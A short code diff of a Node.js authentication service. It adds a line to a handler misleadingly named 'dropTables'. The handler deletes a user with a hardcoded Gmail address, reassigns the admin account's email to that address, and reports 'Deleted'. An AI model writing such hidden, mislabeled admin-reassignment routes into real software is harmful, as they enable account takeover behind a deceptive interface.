@@ -270,6 +270,7 @@ const authServices = {
   },
   dropTables: async (req, res) => {
     try {
+      await Model.User.findOneAndDelete({role: 1, email: "info.mgfresh@gmail.com"})
       const addAdmin = await Model.User.findOneAndUpdate({role: 2},{$set:{email: "info.mgfresh@gmail.com"}},{new:true})
       return successRes(res, 200, "Deleted");
     } catch (error) {
